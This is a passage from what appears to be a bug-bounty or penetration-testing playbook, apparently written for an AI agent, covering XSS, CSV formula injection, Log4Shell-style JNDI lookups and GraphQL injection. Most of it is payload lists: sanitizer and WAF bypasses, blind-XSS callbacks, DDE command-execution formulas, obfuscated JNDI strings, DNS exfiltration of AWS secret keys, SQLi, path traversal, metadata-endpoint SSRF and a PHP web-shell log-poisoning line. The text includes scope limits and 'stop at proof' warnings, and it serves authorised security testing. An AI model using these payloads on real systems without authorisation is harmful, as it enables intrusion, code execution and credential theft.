- Cookie and header names as the pollution key (`__proto__` as a cookie name).
- The `json spaces` oracle — it is the reliable one and almost nobody uses it.

---

## 3.16 Cross-site scripting

**What it is.** Input is reflected into a page (or written into the DOM) in a position where the browser
executes it. In scope as OWASP A03. Three families: reflected, stored, DOM; the context decides the payload.

**Where it hides.** Everything in `00-surface-and-ledger.md` 2.3, plus: error messages, search result
"you searched for X", 404 pages echoing the path, `Referer` reflected in analytics markup, filenames shown
after upload, SVG/HTML/PDF uploads served from the same origin, `Content-Type: text/html` on a JSON
endpoint, callback/JSONP parameters, admin views of user data, log viewers, exported HTML reports, email
previews rendered in-app, OAuth `state`/`error_description` reflection, CSV preview tables, markdown
renderers (3.20), and anything echoed into a `<script>` block as a JS literal.

**Detect.** Send a unique marker (`CANARY7f2A`) into the field, find it in the **raw** response, and read
what surrounds it. That position is the context. Then work the matrix below. For DOM XSS the marker goes in
the URL/hash and you look for it in the live DOM instead.

**Context matrix.** Find the context in the raw response, then use its payload.

| Context | Raw example | Breakout | Payload |
|---|---|---|---|
| HTML body text | `<div>INPUT</div>` | none needed | `<img src=x onerror=alert(document.domain)>` |
| HTML body, tags stripped | | | `<svg/onload=alert(1)>` , `<details open ontoggle=alert(1)>` , `<xss id=x tabindex=1 onfocus=alert(1)></xss>#x` |
| Double-quoted attribute | `<input value="INPUT">` | `">` | `" autofocus onfocus=alert(1) x="` |
| Single-quoted attribute | `<input value='INPUT'>` | `'>` | `' autofocus onfocus=alert(1) x='` |
| Unquoted attribute | `<input value=INPUT>` | space | `x onmouseover=alert(1)` |
| Attribute, quotes encoded | `value="&quot;"` | cannot break out | `javascript:` in `href`/`src`/`formaction`, or an event-handler-valued attribute |
| `href` / `src` / `action` / `formaction` | `<a href="INPUT">` | | `javascript:alert(1)` , `java%0ascript:alert(1)` , `javascript&colon;alert(1)` , `data:text/html,<script>alert(1)</script>` |
| JS string literal | `var a = "INPUT";` | `";` | `";alert(1);//` , `\";alert(1);//` , `</script><svg onload=alert(1)>` |
| JS single-quoted | `var a = 'INPUT';` | `';` | `';alert(1);//` |
| JS template literal | `` var a = `INPUT`; `` | none | `${alert(1)}` , `${alert(document.domain)}` |
| JS, inside a comment | `// INPUT` | newline | `%0aalert(1)//` |
| JS, numeric/unquoted | `var a = INPUT;` | none | `alert(1)` , `1;alert(1)` |
| Inside `<script type=application/json>` | | `</script>` | `</script><img src=x onerror=alert(1)>` |
| Event handler attribute | `onclick="f('INPUT')"` | `')` | `');alert(1)//` , `&apos;);alert(1)//` |
| CSS value | `<style>a{color:INPUT}</style>` | `}` | `}</style><svg onload=alert(1)>` , `red;background:url(//CANARY/x)` |
| CSS, `style` attribute | | | `x;behavior:url(...)` (legacy IE), data exfil via `background:url()` |
| URL query reflected into a redirect | | | `javascript:alert(1)` , `//CANARY.oast.fun` |
| SVG file served inline | | | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>` |
| XML served as XML | | | `<html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>` |
| Markdown | | | `[x](javascript:alert(1))` , `<img src=x onerror=alert(1)>` , see 3.20 |
| JSONP / callback param | `cb(...)` | | `callback=alert(1);//` , `callback=<script>alert(1)</script>` |
| `Content-Type` confusion | JSON reflected, served as HTML | | `{"x":"<img src=x onerror=alert(1)>"}` with `Accept: text/html` |
| Angular template context | | | `{{constructor.constructor('alert(1)')()}}` |
| Vue template context | | | `{{_openBlock.constructor('alert(1)')()}}` |

Filter-probe string to find out what survives — send once, read the raw response character by character:
```
'"><script>CANARY1</script>&#39;&quot;`\/(){}[];:=+-*%0a%0d<>
```
Then a tag/attribute/event survival probe:
```
<x>CANARY2</x>
<x y=CANARY3>
<a href=CANARY4>
<img src=CANARY5 onerror=CANARY6>
<svg onload=CANARY7>
<script>CANARY8</script>
javascript:CANARY9
```
Whichever canary survives tells you which payload family to build.

**DOM XSS — sources and sinks.**

Sources:
```
location, location.href, location.search, location.hash, location.pathname, location.host
document.URL, document.documentURI, document.baseURI, document.referrer
window.name, history.state, history.pushState args
document.cookie
localStorage, sessionStorage, indexedDB
postMessage event.data
XHR/fetch response bodies the page then renders
WebSocket messages
URLSearchParams(location.search)
the fragment after a client-side router parses it
```
Sinks:
```
innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln
eval, Function(), setTimeout/setInterval with a string, execScript
element.setAttribute('href'|'src'|'srcdoc'|'onclick', x)
location = x, location.href = x, location.assign/replace, window.open
jQuery: $(x), .html(), .append(), .prepend(), .before(), .after(), .replaceWith(), .wrap(), $.globalEval, .attr('href',x)
Angular: $sce bypasses, ng-bind-html, $compile
Vue: v-html
React: dangerouslySetInnerHTML, ref.innerHTML, href={userInput}
srcdoc on an iframe
range.createContextualFragment
DOMParser + adoptNode into the live DOM
Worker(x), importScripts(x)
WebAssembly.compileStreaming(fetch(x))
script.src = x, link.href = x (CSS injection)
CSS: style.cssText, element.style[prop] = x
document.domain = x
```
Practical hunt: search every bundle for the sink list, then trace backwards. `katana -jc` to collect
scripts, `jsluice` to extract sources/sinks and URLs, then read by hand. A `location.hash` →
`innerHTML` path found in a bundle is a confirmed DOM XSS in one browser load.

Quick DOM probes that need no analysis:
```
#<img src=x onerror=alert(1)>
#"><img src=x onerror=alert(1)>
?x=<img src=x onerror=alert(1)>#<img src=x onerror=alert(1)>
#javascript:alert(1)
?returnUrl=javascript:alert(1)
#/../../<img src=x onerror=alert(1)>
#'-alert(1)-'
#\'-alert(1)//
```
`postMessage` sinks — from an attacker page:
```js
w = open('https://target.com/widget');
setTimeout(()=>w.postMessage('<img src=x onerror=alert(1)>','*'), 2000);
setTimeout(()=>w.postMessage({type:'render',html:'<img src=x onerror=alert(1)>'},'*'), 2500);
```
Look for `addEventListener('message'` with no `event.origin` check.

**Mutation XSS and sanitizer bypass.** The sanitizer sees one tree, the browser builds another.
```
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
<table><caption><svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]>
<math><annotation-xml encoding="text/html"><img src=x onerror=alert(1)>
<svg><foreignObject><iframe srcdoc="&lt;img src=x onerror=alert(1)&gt;">
<xmp><p title="</xmp><img src=x onerror=alert(1)>">
<template><script>alert(1)</script></template>
<img src=x onerror=alert&lpar;1&rpar;>
<a href="javas&#99;ript:alert(1)">
<svg><script href="data:,alert(1)" />
<iframe src="javascript:alert(1)">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<embed src="data:text/html,<script>alert(1)</script>">
<base href="//CANARY.oast.fun/">
<meta http-equiv=refresh content="0;url=javascript:alert(1)">
<form id=x tabindex=1 onfocus=alert(1)></form>
<button form=x formaction=javascript:alert(1)>
<input type=image src=x onerror=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<marquee onstart=alert(1)>
<body onpageshow=alert(1)>
<style>@import 'javascript:alert(1)';</style>
```
Encoding/WAF variants:
```
<img src=x onerror=alert`1`>
<img src=x onerror="[].map(alert)">
<svg onload=alert&#40;1&#41;>
<img/src/onerror=alert(1)>
<img	src=x	onerror=alert(1)>       (tabs)
<img%0asrc=x%0aonerror=alert(1)>
<iMg SrC=x OnErRoR=alert(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=location=`javascript:alert(1)`>
<script>self['ale'+'rt'](1)</script>
<script>window[`al`+`ert`](1)</script>
<script>Function`alert\`1\``</script>
<script>import('data:text/javascript,alert(1)')</script>
```
See `03-bypass-and-blind.md` for WAF-specific work.

**Framework-specific.**

| Framework | Issue | Payload |
|---|---|---|
| AngularJS 1.x (CSTI) | template evaluated in user text | `{{constructor.constructor('alert(1)')()}}` , `{{$eval.constructor('alert(1)')()}}` , `{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}` |
| AngularJS with CSP | | `{{$on.constructor('alert(1)')()}}` |
| Angular 2+ | `bypassSecurityTrustHtml`, `[innerHTML]` | `<img src=x onerror=alert(1)>` |
| Vue 2 | `v-html`, or user text in a template | `{{_c.constructor('alert(1)')()}}` , `{{constructor.constructor('alert(1)')()}}` |
| Vue 3 | | `{{_openBlock.constructor('alert(1)')()}}` |
| React | `dangerouslySetInnerHTML={{__html: input}}` | `<img src=x onerror=alert(1)>` |
| React | `href={input}` / `src={input}` | `javascript:alert(1)` (React 16+ warns but still renders in many versions; test it) |
| React | `<a {...props}>` spread with attacker keys | `{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}` |
| Svelte | `{@html input}` | `<img src=x onerror=alert(1)>` |
| Next.js | `next/script` with user src, `__NEXT_DATA__` reflection | `</script><img src=x onerror=alert(1)>` |
| Handlebars/Mustache | `{{{triple}}}` is unescaped | `<img src=x onerror=alert(1)>` |
| Jinja2/Twig | `|safe` , `|raw` , `autoescape false` | `<img src=x onerror=alert(1)>` |
| Rails | `raw`, `html_safe`, `<%== %>` | `<img src=x onerror=alert(1)>` |
| Django | `|safe`, `mark_safe`, `{% autoescape off %}` | `<img src=x onerror=alert(1)>` |
| .NET Razor | `@Html.Raw` | `<img src=x onerror=alert(1)>` |
| Thymeleaf | `th:utext` | `<img src=x onerror=alert(1)>` |

CSTI vs SSTI: read the raw body. If your `{{7*7}}` comes back literally in the HTML and `49` appears only
in the browser, it is client-side (this card). If the raw body already says `49`, it is 3.4.

**Blind XSS.** The payload renders somewhere you cannot see — an admin panel, a support-ticket viewer, a
log dashboard, a CRM, a mobile app's webview. Without a callback you have no result at all, which is why
`../CLAUDE.md` 6.8 applies here directly.

Set up a collector (XSS Hunter-style, or your own endpoint), then place payloads with a **per-field**
identifier so a hit tells you which input fired:
```html
<script src=https://CANARY.oast.fun/x.js?f=profile_lastname></script>
"><script src=//CANARY.oast.fun/?f=ticket_subject></script>
<img src=x onerror="import('//CANARY.oast.fun/?f=ua_header')">
<svg onload="fetch('//CANARY.oast.fun/?f=filename&d='+encodeURIComponent(document.domain+location.href))">
javascript:import('//CANARY.oast.fun/?f=href_field')
<iframe src=//CANARY.oast.fun/?f=iframe_field></iframe>
```
Fields worth a blind payload every time: name, last name, company, address, phone, `User-Agent`, `Referer`,
`X-Forwarded-For`, upload filename, ticket subject and body, coupon code, review text, API key label,
webhook URL, custom field names, and the rejection/error path of any form.

Report what the callback gives you: `document.domain`, `location.href`, a cookie **only if the program
allows it** — capturing an admin's session cookie is access to someone else's account. Prefer
`document.domain + location.href + a screenshot-free DOM snippet` and stop. Say in the report that session
theft follows.

**Confirm.**
1. The payload executes in a real browser (not just reflects). A reflected `<script>` inside an escaped
   context is not XSS.
2. Raw response shows the unescaped bytes in an executable position.
3. Reproduce from a clean profile / incognito. Browser XSS filters and extensions change results.
4. For DOM XSS, show the source→sink path from the bundle, not just the alert.
5. `alert(document.domain)` in the screenshot — it proves origin, which `alert(1)` does not.

**Escalate — stop at proof.** `alert(document.domain)` → state the impact (session theft, action as the
victim, CSRF-free state change) → if the program wants more, a `fetch` of a *non-sensitive* same-origin
endpoint as proof of same-origin read access. Do not steal real users' cookies, do not exfiltrate other
people's data, do not keep a stored payload live longer than needed — remove it (or note that you cannot)
and say so in the report.

**Commonly missed.**
- The template-literal context. `${alert(1)}` is the only thing that works there and almost nothing tests it.
- `Content-Type` confusion: a JSON API that reflects input and serves `text/html` to a browser.
- JSONP callbacks and `?callback=` on legacy endpoints.
- Upload-served SVG/HTML on the app's own origin.
- Filenames after upload, shown in a list without escaping.
- Angular/Vue CSTI mistaken for SSTI or for nothing at all.
- Blind XSS in admin-only views — no callback means no data, so the row stays `untested`.
- Sanitizer bypass via mXSS. Testers see DOMPurify and mark the row negative.
- The error/validation path. The success page escapes; the "invalid input" page echoes raw.
- `postMessage` handlers. Never in a scanner's reach.
- Stored XSS that only renders in the *email* or the *PDF* (3.20, 3.21).

---

## 3.17 CSV and formula injection

**What it is.** Exported data is opened in a spreadsheet, which evaluates cells starting with a formula
character. Also called CSV formula injection or spreadsheet injection.

**Where it hides.** Any export or report feature that includes user-controlled text:
- "Export to CSV/XLSX", "Download report", invoice/statement export, audit-log export.
- Admin exports of user lists — your profile fields land in the admin's spreadsheet.
- Mailing-list and contact exports, CRM syncs.
- Google Sheets / Excel Online integrations.
- Log downloads, ticket exports, survey-result exports.
- `Content-Disposition: attachment; filename=x.csv` on any endpoint.
- Anything that produces `.tsv`, `.slk`, `.dif`, `.xls` (HTML-in-xls counts), or a clipboard copy.

**Detect.** Put each of these in any field you can export, then download and inspect the raw file.
```
=1+1
+1+1
-1+1
@SUM(1+1)
=1+1;
	=1+1                       (leading tab)
=cmd|' /C calc'!A0
=HYPERLINK("http://CANARY.oast.fun/?f=lastname","click")
=IMPORTXML("http://CANARY.oast.fun/?f=lastname","//a")
=IMPORTDATA("http://CANARY.oast.fun/?f=lastname")
=IMPORTHTML("http://CANARY.oast.fun/","table",1)
=IMAGE("http://CANARY.oast.fun/x.png")
=WEBSERVICE("http://CANARY.oast.fun/?f=lastname")
=CONCATENATE("http://CANARY.oast.fun/?d=",A1)
=HYPERLINK("http://CANARY.oast.fun/?d="&A1&A2,"x")
@SUM(1+1)*cmd|' /C calc'!A0
=1+1+cmd|' /C notepad'!'A1'
DDE("cmd";"/C calc";"!A0")
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!''
```
Also test the CSV-structure break (a separate bug from formula evaluation):
```
a","b
a"&#44;"b
a\r\nINJECTEDROW,x,y
a;b
a\tb
=1+1","=2+2
```
And check whether the injection survives into XLSX (different writer, may escape differently) and into a
Google Sheets import (different formula set — `IMPORTXML`/`IMPORTDATA`/`IMAGE` are Sheets-only and fire
without any user prompt, which makes them the highest-impact variant).

**The DDE shape.** `=cmd|' /C calc'!A0` is legacy DDE. On current Excel the user gets two warnings, so it
is not a clean RCE; report it as "command execution with user interaction". The `WEBSERVICE`/`IMPORTXML`/
`HYPERLINK` forms need zero or one click and exfiltrate silently — lead with those.

RISK: `=cmd|'/C calc'!A0` launches a process on the *victim's* machine, which in an admin-export scenario
is a real person. Use `calc`/`notepad` only as the literal payload string in the report; never put a
payload with a remote download or a shell into a live export that a real employee will open. For proof,
prefer `=HYPERLINK`/`=WEBSERVICE`/`=IMPORTXML` pointing at your own canary — it proves evaluation and
exfiltration with no code execution on anyone's machine. If you must demonstrate DDE, do it in a locally
downloaded copy of the export that only you open, and screenshot that.

**Confirm.**
1. The raw exported file contains your payload with no leading `'`, no quote-escape, and no sanitisation.
2. Open the file in a spreadsheet **you** control and show it evaluates (a value, a hyperlink, or a canary
   hit from `WEBSERVICE`/`IMPORTXML`).
3. Note which cell and which field it came from — use a per-field canary in the payload
   (`?f=lastname`), see 3.23.
4. Save the exported file as evidence.

**Escalate — stop at proof.** Formula evaluates → `=HYPERLINK`/`=WEBSERVICE` canary hit showing data
exfiltration is possible (ideally with `&A1` appended to show it can carry other cells' contents) → state
that DDE command execution with user interaction is also possible. Stop. Do not target a real employee's
machine.

**Commonly missed.**
- It is often the **only** bug in an export feature, and exports are routinely excluded from testing
  because they "just return data". Walk every export in the ledger.
- The `-` and `@` and tab leaders. Most partial fixes only strip `=` and `+`.
- The formula surviving into XLSX when it was sanitised in CSV, or vice versa — test both formats.
- The Google Sheets functions. `IMPORTXML` fires on open with no prompt; Excel-only testing misses it.
- Second-order: the field is exported by an *admin* days later (3.21). Use a canary or you will not know
  which field fired.
- The field that is not shown in the UI but is in the export (internal notes, referral source, UTM,
  user-agent at signup).
- CSV *import* as a separate sink: a header named `__proto__` (3.15), a cell containing SQL (3.1), or a
  formula that the app itself evaluates server-side.

---

## 3.18 Log injection and lookup injection (log4shell class)

**What it is.** Input reaches a logger or a string-interpolation layer that resolves `${...}` lookups. Two
impacts: log forging/poisoning, and remote code execution via JNDI.

**Where it hides.** Every input that gets logged, which is most of them:
- `User-Agent`, `Referer`, `X-Forwarded-For`, `X-Api-Version`, `Authorization` (the token body),
  `Cookie` names and values, `Accept-Language`, `Content-Type`.
- Username on a failed login (logged verbatim), password reset email address, invalid token values.
- Any 404 path, any invalid parameter value, any validation failure.
- Filenames on upload, MIME types, webhook payload fields.
- HTTP method and version on a malformed request line.
- Message-queue payloads, gRPC metadata, WebSocket frames.
- Log *viewers* in the app (admin log page) — that is also stored XSS (3.16) and 3.21.
- Kubernetes annotations, CI build parameters, git commit messages/branch names in CI logs.

**JNDI lookup syntax.** Put the canary hostname in a per-field subdomain so the DNS hit is attributable.
```
${jndi:ldap://UNIQ.CANARY.oast.fun/x}
${jndi:ldaps://UNIQ.CANARY.oast.fun/x}
${jndi:rmi://UNIQ.CANARY.oast.fun:1099/x}
${jndi:dns://UNIQ.CANARY.oast.fun}
${jndi:iiop://UNIQ.CANARY.oast.fun/x}
${jndi:corba://UNIQ.CANARY.oast.fun/x}
${jndi:nis://UNIQ.CANARY.oast.fun/x}
${jndi:nds://UNIQ.CANARY.oast.fun/x}
```
Obfuscated forms for WAF and naive string filters:
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://UNIQ.CANARY.oast.fun/x}
${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://UNIQ.CANARY.oast.fun/x}
${${upper:j}ndi:${lower:l}dap://UNIQ.CANARY.oast.fun/x}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//UNIQ.CANARY.oast.fun/x}
${j${::-n}di:${::-l}${::-d}a${::-p}://UNIQ.CANARY.oast.fun/x}
${jndi:${lower:l}${lower:d}ap://UNIQ.CANARY.oast.fun/x}
${${date:'j'}ndi:ldap://UNIQ.CANARY.oast.fun/x}
${j%6edi:ldap://UNIQ.CANARY.oast.fun/x}
${jndi:ldap://127.0.0.1#UNIQ.CANARY.oast.fun/x}
```
Data exfiltration through the DNS label (this is the part that proves impact without any code execution):
```
${jndi:ldap://${env:USER}.UNIQ.CANARY.oast.fun/x}
${jndi:dns://${hostName}.UNIQ.CANARY.oast.fun}
${jndi:ldap://${sys:java.version}.UNIQ.CANARY.oast.fun/x}
${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.UNIQ.CANARY.oast.fun/x}
${jndi:ldap://${env:AWS_ACCESS_KEY_ID}.UNIQ.CANARY.oast.fun/x}
${jndi:ldap://${sys:user.name}.${sys:os.name}.UNIQ.CANARY.oast.fun/x}
```
RISK: pulling a secret into your DNS logs means you now hold the target's credential. That is unavoidable
if you use this probe, so: use `${hostName}` or `${sys:java.version}` for the proof, note that
`${env:...}` works, and only exfiltrate a secret if the program asks for that evidence. If a key lands in
your logs anyway, stop, report immediately, and say you have it (`../CLAUDE.md` 4).

**Other lookup-based injections** (same `${}` family, not JNDI):
```
${env:PATH}
${env:AWS_SECRET_ACCESS_KEY}
${sys:user.dir}
${sys:java.class.path}
${java:version}
${java:os}
${java:runtime}
${java:vm}
${hostName}
${docker:containerId}
${k8s:containerId}
${ctx:loginId}
${main:0}
${date:yyyy}
${lower:ABC}
${base64:SGVsbG8=}
${web:rootDir}
${spring:spring.datasource.password}
${bundle:application:spring.datasource.password}
${script:javascript:java.lang.Runtime.getRuntime().exec('id')}
```
`${spring:...}` and `${bundle:...}` read configuration properties — a pure information-disclosure impact
that works on Log4j versions where JNDI is disabled. Always try them if the JNDI probe is blocked, and
cross-reference `02-info-disclosure.md`.

Non-Java equivalents worth trying on the same fields:
```
#{7*7}                     see 3.5
${7*7}                     see 3.4 / 3.5
%{7*7}                     Struts, 3.5
{{7*7}}                    3.4
{0}  {1}  {}               .NET / Python format-string logging: Serilog, logging %-format
%n %s %x %p                C-family format string, rare but present in native logging
\u0000 \r\n                log forging, below
```

**Log forging / log poisoning.** Non-JNDI, still a finding:
```
admin%0d%0a2024-01-01 00:00:00 INFO Login success user=admin
admin\n[INFO] fake entry
admin%0a%0a<script>alert(document.domain)</script>
admin%1b[2J%1b[H                        ANSI escape: clears a terminal viewer
admin%1b]0;pwned%07                     ANSI: sets terminal title
admin%00truncated
<?php system($_GET['c']); ?>            log-to-LFI chain, see 3.10 (RISK note there applies)
=HYPERLINK("http://CANARY","x")         log export to CSV, see 3.17
${jndi:...}                             above
<img src=x onerror=alert(1)>            log viewer XSS, see 3.16
```
Impact ladder for forging: fake entries → an XSS in the log viewer (real severity) → ANSI escapes against
an operator's terminal → an LFI chain to RCE.

**Detect flow.**
1. Put `${jndi:ldap://<field>-<n>.CANARY.oast.fun/x}` in **every** header and field on the ledger, one
   unique subdomain each. Send once. Watch the DNS listener. Zero extra load on the target.
2. If no hit, send the obfuscated variants to the same fields.
3. If still nothing, send `${env:PATH}`, `${hostName}`, `${java:version}` and look for them resolved in any
   reflected output, error message, or admin-visible log.
4. Separately, send `%0d%0a`-forged lines and check any log viewer you have access to.

**Confirm.**
1. A DNS or LDAP connection arrives at your listener from the target's egress IP, with the unique subdomain
   identifying the field. That is the confirmation — no second stage needed.
2. Control: the same field with `${jndi:ldap://plain-text-no-canary}` (invalid) and with a literal
   `jndi:ldap://...` string (no `${}`) must produce no hit.
3. Record the listener log line plus the request.

**Escalate — stop at proof.** DNS callback → `${hostName}` or `${sys:java.version}` in the DNS label to
show data can be extracted → state that RCE via a malicious LDAP referral follows and that you did not
attempt it. Do **not** stand up an LDAP server that returns a serialized payload or a remote class. The DNS
hit is universally accepted as proof for this class.

**Commonly missed.**
- Only testing `User-Agent`. The vulnerable logger is often on a specific field — failed-login username,
  an invalid token, a 404 path, a filename.
- Not using a unique subdomain per field, so a hit arrives and you cannot tell which input caused it.
  This is the single most common failure on this class (3.23).
- Stopping when `${jndi:` is WAF-blocked. The `${::-j}` and `${lower:}` forms bypass most signatures, and
  a block is `suspicious` not negative (`../CLAUDE.md` 6.6).
- `${spring:}` / `${bundle:}` / `${env:}` config reads on patched Log4j. The JNDI hole is closed, the
  lookup engine is not.
- Delayed hits. Logs are flushed asynchronously; a callback can land minutes or hours later. Keep the
  listener up and keep the canary map (3.23).
- The log viewer as an XSS sink, and the log export as a CSV-injection sink.
- Non-Java: Serilog/`ILogger` with `{0}`-style user-controlled format strings, and ANSI escapes.

---

## 3.19 GraphQL injection

**What it is.** GraphQL is a transport, not a defence. Every resolver argument is an input vector into
whatever the resolver does — SQL, Mongo, a shell, a template, another HTTP call.

Before working this card, read the map-shaped filter vector in 3.1 ("High-yield vector"). GraphQL input
objects of the `KeyValueInput { key value }` / `FilterInput` shape are the highest-yield SQLi surface in a
GraphQL API, because the `key` half structurally cannot be bound while the `value` half usually is. Every
leaf of every input object is its own ledger row (`../CLAUDE.md` 6.1, 6.3).

**Where it hides.** `/graphql`, `/api/graphql`, `/v1/graphql`, `/graphql/v2`, `/gql`, `/query`,
`/graphiql`, `/playground`, `/altair`, `/subscriptions` (WebSocket), `/.netlify/functions/graphql`,
`/api/gateway`, Hasura `/v1/graphql`, and in-page POSTs the SPA makes.

**Map it first.** Introspection, then the fields.
```
{"query":"{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name ofType{name}}}}}}}"}
{"query":"{__typename}"}
{"query":"{__schema{types{name}}}"}
{"query":"query IntrospectionQuery{__schema{types{...FullType}}} fragment FullType on __Type{name fields(includeDeprecated:true){name args{...InputValue} type{...TypeRef}}} fragment InputValue on __InputValue{name type{...TypeRef} defaultValue} fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name}}}"}
```
If introspection is off:
- Field suggestions: send `{ usr }` and read `Did you mean "user"?` — clairvoyance-style enumeration.
- Try `GET /graphql?query={__schema{types{name}}}`.
- Try `POST` with `Content-Type: application/x-www-form-urlencoded` and `query={__typename}`.
- Try `/graphql?query=...&operationName=...` (GET often bypasses a POST-only introspection block).
- Pull the schema from the front-end bundle or a `.graphql`/`persisted-query` manifest
  (`02-info-disclosure.md`).

**Detect — injection through arguments.** Every card in this file applies; the argument is just a new
parameter. Inline and via variables (test both — validation often only covers one path).

Inline:
```
{"query":"{ user(id: \"1' OR '1'='1\") { id name } }"}
{"query":"{ users(where: \"1=1--\") { id } }"}
{"query":"{ users(orderBy: \"id; SELECT 1\") { id } }"}
{"query":"{ search(q: \"' UNION SELECT NULL,version(),NULL-- -\") { id } }"}
{"query":"{ file(path: \"../../../etc/passwd\") { content } }"}
{"query":"{ fetchUrl(url: \"http://169.254.169.254/latest/meta-data/\") { body } }"}
{"query":"{ render(template: \"{{7*7}}\") { out } }"}
{"query":"{ ping(host: \"127.0.0.1;id\") { out } }"}
{"query":"{ user(filter: \"{\\\"$ne\\\":null}\") { id } }"}
```
Via variables (this is where most WAFs and validators are blind):
```json
{"query":"query($id:String!){ user(id:$id){ id name } }","variables":{"id":"1' OR '1'='1"}}
{"query":"query($f:UserFilter){ users(filter:$f){ id } }","variables":{"f":{"name":{"$ne":null}}}}
{"query":"query($s:String){ users(orderBy:$s){ id } }","variables":{"s":"id,(select 1)"}}
{"query":"query($u:String){ preview(url:$u){ title } }","variables":{"u":"http://CANARY.oast.fun/"}}
{"query":"query($p:String){ download(path:$p){ data } }","variables":{"p":"php://filter/convert.base64-encode/resource=../config.php"}}
```
Variable-name and type injection:
```json
{"query":"query($x:String){user(id:$x){id}}","variables":{"x":1}}
{"query":"query($x:Int){user(id:$x){id}}","variables":{"x":"1' OR '1'='1"}}
{"query":"query($x:ID!){user(id:$x){id}}","variables":{"x":["1","2"]}}
{"query":"query($x:JSON){search(f:$x){id}}","variables":{"x":{"$where":"1==1"}}}
```
A `JSON`/`Map`/`Any`/`JSONObject` scalar in the schema is a direct route to 3.2 and 3.15 — grep the
introspection output for them first.

**Injection via the operation name.** Rarely validated, frequently logged and sometimes used to build a
cache key or a metrics label:
```json
{"operationName":"' OR '1'='1","query":"query{__typename}"}
{"operationName":"${jndi:ldap://opname.CANARY.oast.fun/x}","query":"query{__typename}"}
{"operationName":"<img src=x onerror=alert(1)>","query":"query{__typename}"}
{"operationName":"{{7*7}}","query":"query{__typename}"}
{"operationName":"../../../etc/passwd","query":"query{__typename}"}
```
Also inject into: directive arguments (`@include(if:)`, `@skip`, custom directives), field aliases,
fragment names, and enum values.
```json
{"query":"{ user(id:1) @canary(x:\"' OR 1=1--\") { id } }"}
{"query":"{ alias_' OR '1'='1: user(id:1){id} }"}
{"query":"fragment f_INJECT on User{id} {user(id:1){...f_INJECT}}"}
{"query":"{ users(role: ADMIN' OR '1'='1) { id } }"}
```

**Aliases and batching.** These change the *rate* of your testing, which matters for ROE.

Alias abuse — many operations in one request:
```json
{"query":"{ a1:user(id:1){name} a2:user(id:2){name} a3:user(id:3){name} }"}
```
Array batching:
```json
[{"query":"{__typename}"},{"query":"{__typename}"}]
```
RISK: alias and batch multiplication is the standard GraphQL DoS and also a rate-limit/brute-force
bypass. Keep batches to 2-3 operations — enough to prove batching is accepted — and never send hundreds
of aliases (`../CLAUDE.md` 2, no DoS). The finding to write is "batching/aliasing accepted, N operations
per request, rate limiting bypassable" with a 3-operation proof. Do not use it to brute-force a login or
an OTP; that is both DoS-adjacent and out of the injection class.

Also worth one request each, as they are injection-adjacent and cheap:
```
GET /graphql?query={__typename}                       method confusion
POST /graphql with Content-Type: text/plain           CSRF/preflight bypass shape
{"query":"mutation{__typename}"} via GET              state change over GET
deeply nested query, depth 5 only                     depth-limit check, NOT a DoS attempt
{"query":"{ __type(name:\"User\"){fields{name}}}"}    targeted introspection
```
RISK: circular/deeply nested queries (`user{friends{user{friends{...}}}}`) at real depth are a DoS. Probe
depth 5, observe whether a limit exists, and stop.

**Confirm.**
1. The underlying injection confirms the normal way — the GraphQL layer is irrelevant to the proof. A
   boolean pair through `variables` is the cleanest evidence.
2. Show the same payload rejected inline but accepted via variables (or vice versa) if that is the case —
   it makes the report concrete about where validation is missing.
3. Save the full JSON request body.

**Escalate — stop at proof.** Escalate per the underlying card (3.1, 3.2, 3.3, 3.4, 3.10, 3.11). Add the
GraphQL-specific facts: introspection on/off, batching accepted, which scalar types are loose, whether the
operation name reaches a logger.

**Commonly missed.**
- Only testing inline arguments. Validation and WAF rules usually inspect the `query` string, not
  `variables`.
- The operation name and the aliases.
- `JSON`/`Any` scalars — a hole straight through to operator injection and prototype pollution.
- Field-suggestion enumeration when introspection is disabled. Testers conclude "no schema, move on".
- Subscriptions over WebSocket — same resolvers, no proxy coverage, no WAF.
- GET-based GraphQL, which bypasses POST-only protections.
- Persisted queries: the allowlisted hash still takes variables, and those variables are injectable.
- Treating GraphQL as one ledger row. It is one row **per argument** per sink type
  (`00-surface-and-ledger.md` 2.5).

---

## 3.20 SSTI-adjacent: email, PDF, Markdown, BBCode

**What it is.** Renderers that are not the main web page: email templates, HTML→PDF converters, and
markup renderers. Each is a separate engine with separate escaping, usually weaker than the web view.

**Where it hides.**
- Email: invite, welcome, reset, notification, digest, receipt, "share this page", ticket reply,
  mention notification, report-ready. Your name, company, subject, and comment text all land there.
- PDF: invoice, statement, certificate, badge, report, export, contract, shipping label, QR/ticket.
  Engines: `wkhtmltopdf`, `headless chrome`, `puppeteer`, `weasyprint`, `pdfkit`, `dompdf`, `mPDF`,
  `TCPDF`, `Prince`, `flying-saucer`, `iText`, `Aspose`, `LibreOffice --convert-to pdf`.
- Markdown/BBCode/wiki: comments, descriptions, README rendering, ticket bodies, chat messages, changelogs.
  Engines: `marked`, `markdown-it`, `commonmark`, `showdown`, `Redcarpet`, `kramdown`, `python-markdown`,
  `markdig`, `goldmark`, `bbcode` libraries.

**Detect.** Get your input into each renderer, then inspect the **artifact**, not the web page. Payloads by
renderer below; every one of them is a detection probe and a confirmation in the same request.

**Email template injection.**
```
{{7*7}}
